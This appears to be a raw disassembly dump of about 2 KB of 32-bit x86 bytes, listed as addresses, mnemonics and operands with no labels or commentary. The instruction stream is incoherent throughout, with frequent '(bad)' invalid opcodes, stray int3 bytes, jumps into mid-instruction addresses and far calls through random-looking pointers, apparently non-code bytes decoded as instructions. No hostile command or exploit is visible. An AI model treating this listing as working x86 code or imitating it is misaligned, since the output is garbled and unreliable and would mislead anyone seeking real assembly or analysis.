  4091e2:	scas   eax,DWORD PTR es:[edi]
  4091e3:	push   ebp
  4091e4:	lods   eax,DWORD PTR ds:[esi]
  4091e5:	mov    DWORD PTR [ecx-0x1],edi
  4091e8:	addr16 int3 
  4091ea:	(bad)  
  4091eb:	jmp    esp
  4091ed:	or     DWORD PTR [edi+eax*4-0x2000001],0x35
  4091f5:	call   FWORD PTR [esi-0x3333467d]
  4091fb:	add    BYTE PTR [edi-0x1],ch
  4091fe:	repz mov ah,0xff
  409201:	(bad)  
  409202:	jns    0x409279
  409204:	pop    edx
  409205:	add    BYTE PTR [edi+edi*8+0x4e],al
  409209:	(bad)  
  40920a:	(bad)  
  40920b:	dec    esp
  40920d:	jmp    DWORD PTR [esi-0x5b]
  409210:	dec    DWORD PTR [ecx-0x242d33]
  409216:	clc    
  409217:	call   DWORD PTR [ebp+0x0]
  40921a:	add    bh,bh
  40921c:	mov    esi,0x836985cc
  409221:	add    BYTE PTR [edx-0x6d],dh
  409224:	or     DWORD PTR [ecx-0x7cb6000e],0xffffffff
  40922b:	int3   
  40922c:	imul   eax,DWORD PTR [eax],0xffffffa1
  40922f:	inc    eax
  409230:	dec    DWORD PTR [ecx-0x75d40a]
  409236:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409237:	add    BYTE PTR [esi-0x7d],dh
  40923a:	add    ah,cl
  40923c:	push   0xffffffff
  40923e:	fcmovbe st,st(6)
  409240:	dec    esp
  409242:	push   ss
  409243:	mov    cl,0x57
  409245:	inc    esi
  409247:	add    BYTE PTR [esi],dh
  409249:	mov    DWORD PTR [ecx-0x29ff8501],ecx
  40924f:	sbb    eax,DWORD PTR [eax]
  409251:	add    BYTE PTR [ebp-0x120044d4],cl
  409257:	int3   
  409258:	sbb    ecx,DWORD PTR [ecx-0xb10001]
  40925e:	test   eax,0x900ff38
  409263:	jge    0x4092e2
  409265:	jmp    FWORD PTR [edx+0x0]
  409268:	add    eax,0xb383ff83
  40926d:	int3   
  40926e:	lock inc ecx
  409270:	dec    esp
  409272:	addr16 pop ss
  409274:	add    BYTE PTR gs:[ecx-0x7d],al
  409278:	adc    DWORD PTR [eax],eax
  40927a:	inc    DWORD PTR [ebx+0x1e2fffaf]
  409280:	inc    DWORD PTR [ebx+0xe41c1]
  409286:	pop    ss
  409287:	mov    DWORD PTR [ecx],ebx
  409289:	dec    DWORD PTR [ecx-0x72006001]
  40928f:	or     bh,bh
  409291:	add    BYTE PTR [ebp+0x52],bh
  409294:	inc    esp
  409295:	call   DWORD PTR [ebp+0x0]
  409298:	push   ebx
  409299:	inc    DWORD PTR [eax]
  40929b:	xor    DWORD PTR [ebx],0xffffff83
  40929e:	lods   al,BYTE PTR ds:[esi]
  40929f:	stos   DWORD PTR es:[edi],eax
  4092a0:	add    BYTE PTR [eax],al
  4092a2:	aaa    
  4092a3:	std    
  4092a4:	test   BYTE PTR [eax],al
  4092a6:	stos   BYTE PTR es:[edi],al
  4092a7:	mov    edx,edi
  4092a9:	inc    DWORD PTR [eax]
  4092ab:	mov    edi,eax
  4092ad:	call   FWORD PTR [ebp+0x4a]
  4092b0:	(bad)  
  4092b1:	jmp    DWORD PTR [esi+edi*4-0x33d7ffff]
  4092b8:	sahf   
  4092b9:	add    BYTE PTR [eax],al
  4092bb:	int3   
  4092bc:	xchg   ecx,eax
  4092bd:	add    BYTE PTR [esi+0x30],bl
  4092c0:	or     esp,0xffffffdf
  4092c3:	push   cs
  4092c4:	xchg   ebp,eax
  4092c5:	jmp    FWORD PTR [edx]
  4092c7:	push   DWORD PTR [esi-0x1]
  4092ca:	add    BYTE PTR [ebx+0x1b1400bf],al
  4092d0:	cmp    edi,0xffffffa8
  4092d3:	(bad)
  4092d7:	add    ch,bl
  4092d9:	add    BYTE PTR [ebx+0x7eff2683],al
  4092df:	pushf  
  4092e0:	add    BYTE PTR [eax],al
  4092e2:	gs or  ecx,edi
  4092e5:	inc    ebx
  4092e7:	add    bl,dh
  4092e9:	int3   
  4092ea:	add    BYTE PTR [eax],al
  4092ec:	stos   BYTE PTR es:[edi],al
  4092ed:	push   edx
  4092ef:	es (bad) 
  4092f1:	(bad)  
  4092f2:	jp     0x4092ae
  4092f4:	pop    esi
  4092f5:	add    bh,ch
  4092f7:	mov    DWORD PTR ds:0x10cc8300,ebp
  4092fd:	dec    DWORD PTR [edi+0x26ff00d7]
  409303:	push   esi
  409304:	jb     0x409306
  409306:	push   ebx
  409307:	int3   
  409308:	push   edi
  409309:	add    bh,bh
  40930b:	call   FWORD PTR [eax-0xff801]
  409311:	int3   
  409312:	mov    dh,0x18
  409314:	mov    edi,edi
  409316:	dec    edi
  409317:	add    ch,ch
  409319:	inc    DWORD PTR [eax]
  40931b:	add    BYTE PTR [ecx],bh
  40931d:	call   FWORD PTR [eax-0xf00ff01]
  409323:	rcl    DWORD PTR [esi+0x0],0x2d
  409327:	jmp    DWORD PTR [edx+0x7cffffff]
  40932d:	add    BYTE PTR [edi],ch
  40932f:	mov    BYTE PTR [eax],0xff
  409332:	push   ss
  409333:	stos   BYTE PTR es:[edi],al
  409334:	mov    edi,edi
  409336:	nop
  409337:	cmp    DWORD PTR ds:0x8aff0083,0x0
  40933e:	(bad)  
  40933f:	mov    edx,0xed74ccff
  409344:	dec    edi
  409345:	mov    esi,eax
  409347:	add    BYTE PTR [edi-0x147c0100],ah
  40934d:	add    BYTE PTR [eax+0x500ffdf],cl
  409353:	and    DWORD PTR [eax+0x7d004200],edi
  409359:	or     esp,0xffffffff
  40935c:	cwde   
  40935d:	add    dh,dh
  40935f:	in     al,0xff
  409361:	add    BYTE PTR [ebx-0x2133d247],al
  409367:	add    BYTE PTR [ebx],bl
  409369:	(bad)  
  40936a:	(bad)  
  40936b:	dec    DWORD PTR [edi+edi*8]
  40936e:	js     0x4092f0
  409370:	(bad)  
  409371:	(bad)  
  409372:	in     al,dx
  409373:	adc    BYTE PTR [esi+0x0],ah
  409376:	rol    BYTE PTR [ebx-0x33a9],cl
  40937c:	cmc    
  40937d:	push   DWORD PTR [edx]
  40937f:	inc    edi
  409380:	dec    esp
  409382:	scas   al,BYTE PTR es:[edi]
  409383:	and    al,0xe1
  409385:	(bad)  
  409386:	mov    eax,0x891ecc
  40938b:	add    BYTE PTR [eax+eax*1],ch
  40938e:	aam    0xf8
  409390:	(bad)  
  409391:	(bad)  
  409392:	mov    edi,0x1e8367e2
  409397:	dec    DWORD PTR [ebp+0x0]
  40939a:	add    bh,bh
  40939c:	inc    eax
  40939d:	int3   
  40939e:	xor    eax,0x1eff899a
  4093a3:	sub    al,ah
  4093a5:	xor    DWORD PTR [edi-0xfffe7d],0xffffffff
  4093ac:	sbb    al,0x0
  4093ae:	add    DWORD PTR [edx-0x194a0100],ebp
  4093b4:	loop   0x4093b5
  4093b6:	inc    ecx
  4093b7:	add    BYTE PTR [esi-0x1b33ff01],bh
  4093bd:	dec    DWORD PTR [edx-0x21]
  4093c0:	int3   
  4093c1:	add    BYTE PTR [ebp-0x6a],al
  4093c4:	or     al,0xff
  4093c6:	mov    ecx,0xffff3fff
  4093cb:	inc    esp
  4093cd:	add    BYTE PTR [ecx+0x4f],bl
  4093d0:	add    DWORD PTR [eax],0x7f
  4093d3:	aad    0x4c
  4093d5:	add    BYTE PTR [eax-0x77],cl
  4093d8:	rol    BYTE PTR [ebx-0x7c067d00],cl
  4093de:	es mov dh,0x89
  4093e1:	call   DWORD PTR [ebx+0x4a]
  4093e4:	xor    eax,0x99ff63ff
  4093e9:	add    BYTE PTR [ebx+0x48008fff],al
  4093ef:	cmp    bh,bh
  4093f1:	int3   
  4093f2:	(bad)  
  4093f3:	cmp    eax,DWORD PTR [ebp-0x1]
  4093f6:	push   cs
  4093f7:	(bad)  
  4093f8:	mov    ebx,0xaeffffff
  4093fd:	add    ch,bh
  4093ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409400:	add    BYTE PTR [eax],al
  409402:	add    eax,DWORD PTR [edx-0x7e]
  409405:	dec    DWORD PTR [esi-0xa300]
  40940b:	call   DWORD PTR [ecx+0xd355ff]
  409411:	add    bl,ah
  409413:	fidiv  DWORD PTR [edi+0x0]
  409416:	daa    
  409417:	inc    DWORD PTR [ebp-0x16340000]
  40941d:	inc    DWORD PTR [ebx]
  40941f:	retf   0x0
  409422:	mov    BYTE PTR [edi-0x290097],ch
  409428:	cmp    eax,0x3700ffff
  40942d:	call   edi
  40942f:	mov    al,ds:0x18aa0089
  409434:	test   bh,bh
  409436:	repnz add BYTE PTR [ebx+eax*4+0x0],bh
  40943b:	inc    DWORD PTR [edx-0x1]
  40943e:	dec    esp
  40943f:	ss add bh,bh
  409442:	aas    
  409443:	and    al,0xe3
  409445:	inc    DWORD PTR [ebx-0xff6601]
  40944b:	jmp    FWORD PTR ds:0xff85a4ff
  409451:	inc    DWORD PTR [edx+0x2e]
  409454:	push   ebp
  409455:	add    BYTE PTR [edx-0x34],cl
  409458:	dec    ecx
  409459:	inc    DWORD PTR [ebx+0x30fff7ff]
  40945f:	fdivp  st(7),st
  409461:	call   FWORD PTR [edi]
  409463:	or     esp,DWORD PTR [ebx+0x68ff5bcc]
  409469:	inc    DWORD PTR [eax]
  40946b:	jmp    esi
  40946d:	jmp    ebp
  40946f:	in     al,0x83
  409471:	mov    DWORD PTR [edi+0x28],edx
  409474:	(bad)  
  409475:	push   DWORD PTR [esi+0xff9283]
  40947b:	adc    eax,0xffffff83
  40947e:	and    esp,eax
  409480:	inc    DWORD PTR [eax]
  409482:	pop    ecx
  409483:	test   cl,bh
  409485:	dec    ebp
  409487:	mov    DWORD PTR [ebp-0x1],edx
  40948a:	mov    DWORD PTR [ecx-0x7d4a0075],ecx
  409490:	inc    DWORD PTR [eax]
  409492:	mov    ebp,0x44ffdf2f
  409497:	add    BYTE PTR [esp+ecx*8-0x1],cl
  40949b:	call   FWORD PTR [esi-0x34]
  40949e:	das    
  40949f:	cmc    
  4094a0:	int3   
  4094a1:	adc    DWORD PTR [edi],0xfffffff0
  4094a4:	(bad)  
  4094a5:	jmp    ebx
  4094a7:	cmp    DWORD PTR [edi],0x0
  4094aa:	(bad)  
  4094ab:	(bad)  
  4094ac:	aas    
  4094ad:	add    BYTE PTR [eax],cl
  4094af:	in     al,0x0
  4094b1:	and    DWORD PTR [eax-0x67ffe758],0xffffff83
  4094b8:	mov    eax,DWORD PTR [eax]
  4094ba:	inc    DWORD PTR [eax]
  4094bc:	pop    eax
  4094bd:	add    cl,dl
  4094bf:	(bad)  
  4094c0:	(bad)  
  4094c1:	push   DWORD PTR [edx]
  4094c3:	addr16 cld 
  4094c5:	int3   
  4094c6:	mov    edi,0x83ff9689
  4094cb:	push   DWORD PTR [eax-0x7d]
  4094ce:	dec    ecx
  4094cf:	rol    DWORD PTR [eax],1
  4094d1:	int3   
  4094d2:	cmp    eax,0x6ffe957
  4094d7:	add    BYTE PTR [eax],bl
  4094d9:	add    bh,bh
  4094db:	mov    DWORD PTR [edi+edi*8+0xcca321],ebp
  4094e2:	pop    ds
  4094e3:	out    dx,al
  4094e4:	mov    BYTE PTR [eax],al
  4094e6:	jno    0x409471
  4094e8:	dec    ebp
  4094e9:	cmp    edi,0x0
  4094ec:	je     0x4094ee
  4094ee:	bound  ecx,QWORD PTR [edi-0x1]
  4094f1:	(bad)  
  4094f2:	in     eax,dx
  4094f3:	(bad)  
  4094f4:	jp     0x4094f6
  4094f6:	mov    ds:0xcc0014ff,eax
  4094fb:	mov    DWORD PTR [ebx-0x3b1801],esp
  409501:	inc    DWORD PTR [ecx+0x61]
  409504:	sti    
  409505:	add    BYTE PTR [ebp+0xaaff],cl
  40950b:	add    dh,bl
  40950d:	int3   
  40950e:	leave  
  40950f:	rol    BYTE PTR [eax],cl
  409511:	mov    DWORD PTR [esi-0x36ff04fd],edi
  409517:	sbb    DWORD PTR [ebx+0x4289ff89],0x0
  40951e:	clc    
  40951f:	mov    ch,0x0
  409521:	call   FWORD PTR [esi]
  409523:	mov    bh,0x28
  409525:	add    BYTE PTR [esi],dl
  409527:	cmp    DWORD PTR [ebx+0x0],0x0
  40952b:	mov    DWORD PTR [edx],edx
  40952d:	jmp    DWORD PTR [esi-0x7c33008c]
  409533:	int3   
  409534:	adc    al,0x0
  409536:	sar    bh,1
  409538:	inc    edx
  409539:	cmp    edi,0xffffffff
  40953c:	data16 add BYTE PTR [ebx+0x7c],bl
  409540:	inc    DWORD PTR [ebx-0x286a33]
  409546:	dec    eax
  409547:	cmp    DWORD PTR [eax+0x6b830000],0xffffffff
  40954e:	add    dh,ch
  409550:	(bad)  
  409551:	push   ebx
  409553:	(bad)  
  409554:	das    
  409555:	push   DWORD PTR [ebx]
  409557:	add    BYTE PTR [eax-0x70ff7700],bl
  40955d:	int3   
  40955e:	sub    dl,bl
  409560:	(bad)  
  409561:	call   DWORD PTR [ecx+0x55]
  409564:	aam    0xff
  409566:	jecxz  0x409568
  409568:	mov    ebp,0xc50083ff
  40956d:	add    BYTE PTR [ebx-0x48337c7c],bh
  409573:	loop   0x4095bf
  409575:	inc    DWORD PTR [ebx+0xffc700]
  40957b:	add    dh,dl
  40957d:	push   esp
  40957f:	gs (bad) 
  409581:	(bad)  
  409582:	mov    esp,0xa8ffe081
  409587:	add    BYTE PTR [eax+eax*1+0x97ffff],cl
  40958e:	adc    eax,0x2400ff1a
  409593:	pusha  
  409594:	xor    al,0xcc
  409596:	fld    QWORD PTR [eax]
  409598:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409599:	dec    DWORD PTR [ecx-0x707c6b00]
  40959f:	rol    DWORD PTR [eax],cl
  4095a1:	push   DWORD PTR [ebp+esi*4+0x5e]
  4095a5:	sub    DWORD PTR [eax-0xc57d],0xffffffff
  4095ac:	lods   eax,DWORD PTR ds:[esi]
  4095ad:	add    BYTE PTR [ecx],bl
  4095af:	and    al,BYTE PTR [eax]
  4095b1:	xor    ebp,0x6c
  4095b4:	enter  0xe0ff,0xff
  4095b8:	jae    0x4095ba
  4095ba:	add    bh,bh
  4095bc:	mov    ebp,0xff3f2589
  4095c1:	jmp    edi
  4095c3:	inc    edx
  4095c4:	or     eax,0x39003700
  4095c9:	(bad)  
  4095ca:	(bad)  
  4095cb:	inc    DWORD PTR [ecx]
  4095cd:	add    cl,dh
  4095cf:	hlt    
  4095d0:	add    BYTE PTR [eax],al
  4095d2:	daa    
  4095d3:	sbb    eax,0x3b00c5ff
  4095d9:	dec    DWORD PTR [ecx+0x40ff4689]
  4095df:	inc    ebp
  4095e0:	(bad)  
  4095e1:	dec    DWORD PTR [edi]
  4095e3:	bound  esi,QWORD PTR [ebp-0x6c00047d]
  4095e9:	int3   
  4095ea:	int3   
  4095eb:	inc    DWORD PTR [edx+0x0]
  4095ee:	sub    eax,0xf3000052
  4095f3:	cmp    al,0xdf
  4095f5:	push   DWORD PTR ds:0xff838883
  4095fb:	dec    DWORD PTR [edx+0x0]
  4095fe:	jge    0x40959f
  409600:	inc    DWORD PTR [eax]
  409602:	mov    bl,BYTE PTR [edx-0x16]
  409605:	sbb    eax,0x0
  409608:	arpl   WORD PTR [eax],ax
  40960a:	mov    edi,edi
  40960c:	inc    ecx
  40960d:	add    BYTE PTR [ebp-0x1a0000ca],bl
  409613:	add    DWORD PTR [ebp+0x0],edx
  409616:	sar    bh,1
  409618:	push   0xcf830089
  40961d:	mov    DWORD PTR [edx-0x60],edx
  409620:	cmp    edi,0xffffffa0
  409623:	mov    ah,0x66
  409625:	or     eax,0x0
  409628:	mov    bh,0x0
  40962a:	(bad)  
  40962b:	jmp    FWORD PTR [eax+0x0]
  40962e:	imul   ebx,DWORD PTR [ecx-0x1],0x0
  409632:	and    esi,DWORD PTR [edi]
  409634:	or     cl,ah
  409636:	enter  0x2bff,0xff
  40963a:	inc    DWORD PTR [ebx-0x5a77005c]
  409640:	(bad)  
  409641:	push   edx
  409643:	aaa    
  409644:	sbb    esp,ecx
  409646:	or     al,BYTE PTR [ebx-0x76337b]
  40964c:	xchg   edi,eax
  40964d:	call   FWORD PTR [edx-0x6d333379]
  409653:	rol    DWORD PTR [eax],0x89
  409656:	fcos   
  409658:	cmp    al,0x89
  40965a:	dec    DWORD PTR [ecx+0x66d2ff14]
  409660:	dec    esp
  409662:	xchg   edi,eax
  409663:	mov    ah,0xae
  409665:	add    ch,dh
  409667:	add    BYTE PTR [edx-0x1],bh
  40966a:	dec    esp
  40966c:	and    edi,edi
  40966e:	xchg   esi,eax
  40966f:	sahf   
  409670:	(bad)  
  409671:	call   DWORD PTR [esi-0x3]
  409674:	repz push DWORD PTR [ecx]
  409677:	add    BYTE PTR [esi-0x1],cl
  40967a:	add    BYTE PTR [eax],al
  40967c:	or     al,BYTE PTR [eax]
  40967e:	int    0x56
  409680:	dec    esp
  409682:	jae    0x40968c
  409684:	inc    DWORD PTR [eax]
  409686:	pop    ebp
  409687:	dec    DWORD PTR [eax]
  409689:	add    BYTE PTR [eax],al
  40968b:	jmp    FWORD PTR [ebp-0xaada01]
  409691:	add    BYTE PTR [eax+ecx*2+0x57],bl
  409695:	inc    DWORD PTR [edi-0x1]
  409698:	mov    DWORD PTR [ebx+0x1cffff],eax
  40969e:	bound  eax,QWORD PTR [eax+0x7c5affff]
  4096a4:	mov    eax,ds:0x8fcc75ff
  4096a9:	add    BYTE PTR [ecx-0x3fffcb01],cl
  4096af:	sar    edi,0xff
  4096b2:	push   0x7fff9471
  4096b7:	adc    DWORD PTR [eax-0x7500ff01],0xffffffff
  4096be:	les    ebx,FWORD PTR [ecx]
  4096c0:	(bad)  
  4096c1:	inc    DWORD PTR [ebp-0x13]
  4096c4:	dec    edi
  4096c5:	jmp    FWORD PTR [edi+0x0]
  4096c8:	leave  
  4096c9:	add    bh,bh
  4096cb:	add    BYTE PTR [edx],al
  4096cd:	mov    DWORD PTR [esi],eax
  4096cf:	jno    0x40969d
  4096d1:	sbb    ebx,0x2b
  4096d4:	repz add BYTE PTR [edi-0xff8301],dl
  4096db:	dec    DWORD PTR [ecx+ecx*4-0x56]
  4096df:	inc    DWORD PTR [bp+di+0xb73]
  4096e4:	cmp    bh,0x19
  4096e7:	(bad)  
  4096e8:	cmp    eax,0x9bffffff
  4096ed:	push   ecx
  4096ef:	pop    esi
  4096f0:	add    BYTE PTR [eax],al
  4096f2:	adc    eax,esp
  4096f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096f5:	add    BYTE PTR [ebp-0x3901],dl
  4096fb:	call   DWORD PTR [ebx+0x9914ff]
  409701:	add    BYTE PTR [eax-0x4200e290],cl
  409707:	jmp    FWORD PTR [ebp-0x2400ff01]
  40970d:	int3   
  40970e:	push   cs
  40970f:	push   0xffb6b3ff
  409714:	mov    DWORD PTR [edi],esi
  409716:	add    eax,0xa11500ff
  40971b:	add    DWORD PTR [eax],0x74
  40971e:	rol    DWORD PTR [ebx-0x3a4900],0x0
  409725:	aaa    
  409726:	mov    ch,0xff
  409728:	add    BYTE PTR [eax+ebx*1-0x7d],ch
  40972c:	push   DWORD PTR [edx+0x1a00cc54]
  409732:	dec    esi
  409733:	inc    DWORD PTR [eax]
  409735:	retf   0xffd3
  409738:	mov    edi,edi
  40973a:	inc    eax
  40973b:	(bad)  
  40973c:	call   FWORD PTR [ebp+0x3500ffde]
  409742:	pop    edx
  409743:	dec    esp
  409745:	pop    ss
  409746:	sar    bh,cl
  409748:	inc    DWORD PTR [ebp-0x4a007c4b]
  40974e:	(bad)  
  40974f:	(bad)  
  409750:	push   DWORD PTR [ecx]
  409752:	inc    ebp
  409753:	inc    DWORD PTR [eax]
  409755:	test   BYTE PTR [ebp-0x77],bl
  409758:	add    BYTE PTR [ecx+0x5a],dh
  40975b:	dec    esp
  40975d:	xor    DWORD PTR [ecx+0x0],0xffffffff
  409761:	aaa    
  409762:	fcos   
  409764:	add    BYTE PTR [ecx+0x40],dh
  409767:	add    BYTE PTR [eax],al
  409769:	mov    ecx,0x170000e7
  40976e:	dec    ebx
  40976f:	mov    edi,edi
  409771:	aaa    
  409772:	xlat   BYTE PTR ds:[ebx]
  409773:	add    bh,bh
  409775:	(bad)  
  409777:	mov    DWORD PTR [eax],eax
  409779:	mov    edx,DWORD PTR [edi+0xc7c0000]
  40977f:	inc    DWORD PTR [eax]
  409781:	jge    0x40976f
  409783:	inc    DWORD PTR [ebx+0x94d3]
  409789:	push   edi
  40978a:	or     eax,0x3d59ffff
  40978f:	add    BYTE PTR [ecx-0x7645fe],cl
  409795:	inc    DWORD PTR [ecx]
  409797:	(bad)  
  409798:	call   DWORD PTR [esi]
  40979a:	pop    ecx
  40979b:	add    DWORD PTR [ebx+0xff969e],0x74
  4097a2:	ja     0x4097a3
  4097a4:	jmp    DWORD PTR [ecx+eiz*4+0x2d470089]
  4097ab:	(bad)  
  4097ac:	jmp    DWORD PTR [ecx+0x75ffcce5]
  4097b2:	inc    esi
  4097b3:	add    bh,bh
  4097b5:	dec    ebx
  4097b6:	adc    edi,edi
  4097b8:	dec    esi
  4097ba:	out    0x0,eax
  4097bc:	mov    DWORD PTR [esi+0x7b],esp
  4097bf:	int3   
  4097c0:	add    BYTE PTR [ebx],dl
  4097c2:	push   ds
  4097c3:	(bad)  
  4097c4:	jmp    DWORD PTR [edx]
  4097c6:	mov    esi,0xbbb90083
  4097cb:	dec    esp
  4097cd:	adc    al,0x26
  4097cf:	add    BYTE PTR [ebx+0x83d39b],al
  4097d5:	dec    edx
  4097d6:	mov    al,0xcc
  4097d8:	and    esp,0x28
  4097db:	(bad)  
  4097dc:	call   DWORD PTR [eax-0x4e00ffee]
  4097e2:	test   BYTE PTR [ecx-0xba4e01],0xff
  4097e9:	mov    eax,ds:0xedff834b
  4097ee:	aad    0xff
  4097f0:	add    BYTE PTR [eax],dl
  4097f2:	add    eax,0xdc0083ff
  4097f7:	add    BYTE PTR [eax],al
  4097f9:	xor    esi,DWORD PTR [esi]
  4097fb:	int3   
  4097fc:	call   FWORD PTR [eax+0x1b]
  4097ff:	add    BYTE PTR [eax],al
  409801:	mov    WORD PTR [edi+0x0],es
  409804:	jmp    FWORD PTR [ebx-0x4f000091]
  40980a:	fiadd  WORD PTR [eax]
  40980c:	call   FWORD PTR [edi]
  40980e:	test   DWORD PTR [eax],eax
  409810:	dec    DWORD PTR [ebp+0x3aff008d]
  409816:	mov    al,ds:0xf1f5ff00
  40981b:	inc    DWORD PTR [ebx-0x337ca27d]
  409821:	sbb    DWORD PTR [ebp+0x73b0089],ebx
  409827:	int3   
  409828:	push   DWORD PTR [esi+0x280000c9]
  40982e:	fdivr  st,st(7)
  409830:	add    BYTE PTR [ebp-0x14],bh
  409833:	add    BYTE PTR [eax],al
  409835:	je     0x409815
  409837:	inc    DWORD PTR [ebx-0x45d4]
  40983d:	fidiv  WORD PTR [ebx]
  40983f:	(bad)  
  409840:	jmp    DWORD PTR [eax+eax*1+0x68410000]
  409847:	cmp    edi,0x13
  40984a:	mov    edx,0x7d0b8900
  40984f:	add    BYTE PTR [eax],al
  409851:	daa    
  409852:	pop    ds
  409853:	add    BYTE PTR [eax],al
  409855:	push   ebx
  409856:	sub    eax,0xc88ff00
  40985b:	add    BYTE PTR [eax],al
  40985d:	repz mov edx,0x13700000
  409863:	add    DWORD PTR [eax],0x48
  409866:	popf   
  409867:	(bad)  
  409868:	push   DWORD PTR [esi]
  40986a:	hlt    
  40986b:	inc    DWORD PTR [ebx+0x839650]
  409871:	sub    DWORD PTR [eax],0x0
  409874:	jmp    FWORD PTR [ecx+ebx*1]
  409877:	add    bh,bh
  409879:	js     0x4098fa
  40987b:	inc    DWORD PTR [ebx-0x7600269c]
  409881:	cs or  al,0xff
  409884:	add    BYTE PTR [ebx-0x6cff001c],ch
  40988a:	call   0x83cc:0x8c96ff83
  409891:	mov    esp,0xf0fffff8
  409896:	add    BYTE PTR es:[eax],al
  409899:	add    dh,BYTE PTR [edi-0x1]
  40989c:	call   DWORD PTR [esi]
  40989e:	pop    es
  40989f:	add    BYTE PTR [ecx-0x7c05a8],cl
  4098a5:	xor    al,ch
  4098a7:	inc    DWORD PTR [ebx-0x7c00fa98]
  4098ad:	jp     0x40985b
  4098af:	add    BYTE PTR [eax],al
  4098b1:	in     eax,dx
  4098b2:	es cmp edi,0xffffffdb
  4098b6:	loop   0x40983b
  4098b8:	int3   
  4098b9:	ins    BYTE PTR es:[edi],dx
  4098ba:	cmp    eax,0x45210000
  4098bf:	add    bh,bh
  4098c1:	cmp    DWORD PTR [ebp-0x1],esi
  4098c4:	int3   
  4098c5:	pop    ecx
  4098c6:	xchg   ebx,eax
  4098c7:	dec    esp
  4098c9:	or     eax,0x8ffffab
  4098ce:	(bad)  
  4098cf:	inc    DWORD PTR [eax]
  4098d1:	in     al,0xbd
  4098d3:	int3   
  4098d4:	add    dh,bl
  4098d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098d7:	add    bh,bh
  4098d9:	mov    ds:0x6583ffef,eax
  4098de:	cmp    al,0x0
  4098e0:	push   esi
  4098e2:	inc    esp
  4098e3:	add    bh,bh
  4098e5:	fwait
  4098e6:	idiv   bh
  4098e8:	push   edx
  4098ea:	inc    DWORD PTR [ebx+0x584189]
  4098f0:	push   esp
  4098f2:	cli    
  4098f3:	add    DWORD PTR [eax],0x15
  4098f6:	pusha  
  4098f7:	add    BYTE PTR [ebx-0x7c33e6bc],al
  4098fd:	jmp    0xff52:0xd7ff8938
  409904:	int3   
  409905:	lods   eax,DWORD PTR ds:[esi]
  409906:	stos   DWORD PTR es:[edi],eax
  409907:	(bad)  
  409908:	dec    DWORD PTR [edi]
  40990a:	mov    eax,ds:0x6ea7ff00
  40990f:	inc    DWORD PTR [eax]
  409911:	fisttp QWORD PTR [ecx]
  409913:	inc    DWORD PTR [eax]
  409915:	adc    ecx,0x5f4cff83
  40991b:	(bad)  
  40991c:	push   ebp
  40991e:	aaa    
  40991f:	(bad)  
  409920:	push   DWORD PTR [ebp+0x70cc00e6]
  409926:	call   0xa3ef98ae
  40992b:	inc    DWORD PTR [eax]
  40992d:	pop    ebp
  40992e:	retf   
  40992f:	cmp    edi,0xffffff9b
  409932:	add    DWORD PTR [ebx-0x937801],0xffffff83
  409939:	mov    al,ds:0xcffff1f
  40993e:	sahf   
  40993f:	add    BYTE PTR [eax],al
  409941:	cld    
  409942:	and    edi,edi
  409944:	jmp    FWORD PTR [edx+0x5a]
  409947:	add    BYTE PTR [eax],al
  409949:	sub    BYTE PTR [eax-0x510dff01],bh
  40994f:	add    ah,cl
  409951:	adc    ecx,DWORD PTR [edi+0x13a7ffff]
  409957:	inc    DWORD PTR [eax]
  409959:	cmp    al,0x77
  40995b:	(bad)  
  40995c:	jmp    ebp
  40995e:	retf   
  40995f:	(bad)  
  409960:	(bad)  
  409961:	in     eax,dx
  409962:	add    BYTE PTR [eax],al
  409964:	call   FWORD PTR [ecx+eiz*4]
  409967:	add    DWORD PTR [eax],0x53
  40996a:	push   0x4e20ffff
  40996f:	dec    esp
  409971:	mov    esp,0xbaffff8b
  409976:	fld    DWORD PTR [eax]
  409978:	add    DWORD PTR [ebp-0x64ff00c8],0xffffffa8
  40997f:	cmp    edi,0xffffffcb
  409982:	sar    bh,cl
  409984:	push   DWORD PTR [esi]
  409986:	jl     0x409987
  409988:	dec    esi
  40998a:	idiv   bh
  40998c:	or     DWORD PTR [ebx],0x37
  40998f:	(bad)  
  409990:	jmp    esp
  409992:	(bad)  
  409994:	add    BYTE PTR [edx],dh
  409996:	cmc    
  409997:	int3   
  409998:	push   DWORD PTR [eax-0x6ff7686]
  40999e:	push   esp
  40999f:	(bad)  
  4099a0:	(bad)  
  4099a1:	cmp    eax,0xc7ff00b2
  4099a6:	add    eax,0x4af2ffff
  4099ab:	add    BYTE PTR [eax],al
  4099ad:	cmp    al,0x3d
  4099af:	add    DWORD PTR [eax],0xfffffff7
  4099b2:	sahf   
  4099b3:	add    bh,bh
  4099b5:	cmp    bh,dh
  4099b7:	(bad)  
  4099b8:	(bad)  
  4099b9:	(bad)  
  4099ba:	mov    ah,0x0
  4099bc:	call   DWORD PTR [eax-0x1800ffbe]
  4099c2:	pop    ebp
  4099c3:	int3   
  4099c4:	adc    DWORD PTR [esi+0xdff83b9],0xffffff97
  4099cb:	cmp    edi,0xffffffe2
  4099ce:	ss int3 
  4099d0:	mov    eax,edx
  4099d2:	scas   eax,DWORD PTR es:[edi]
  4099d3:	int3   
  4099d4:	mov    ebp,edx
  4099d6:	mov    edi,0xc0e5ff00
  4099db:	add    BYTE PTR [eax],al
  4099dd:	cmp    al,0xa4
  4099df:	(bad)  
  4099e0:	jmp    FWORD PTR [ebx+0x15ffff80]
  4099e6:	pop    ds
  4099e7:	mov    edi,edi
  4099e9:	add    al,0x19
  4099eb:	cmp    edi,0x2a
  4099ee:	cdq    
  4099ef:	inc    DWORD PTR [eax]
  4099f1:	push   ebx
  4099f2:	sbb    bh,bh
  4099f4:	jmp    FWORD PTR [ecx+eax*4]
  4099f7:	cmp    edi,0xffffffaa
  4099fa:	mov    DWORD PTR [ecx-0xc57a01],ecx
  409a00:	add    BYTE PTR [edx+0x55],dh
  409a03:	add    bh,bh
  409a05:	add    BYTE PTR [edx],ah
  409a07:	add    BYTE PTR [eax],al
  409a09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a0a:	pop    esp
  409a0b:	add    bh,bh
  409a0d:	ins    BYTE PTR es:[edi],dx
  409a0e:	mov    al,0xcc
  409a10:	dec    DWORD PTR [ebp+0x4affff82]
  409a16:	in     al,dx
  409a17:	add    bh,bh
  409a19:	aad    0xbc
  409a1b:	add    DWORD PTR [eax],0xffffffda
  409a1e:	out    dx,eax
  409a1f:	(bad)  
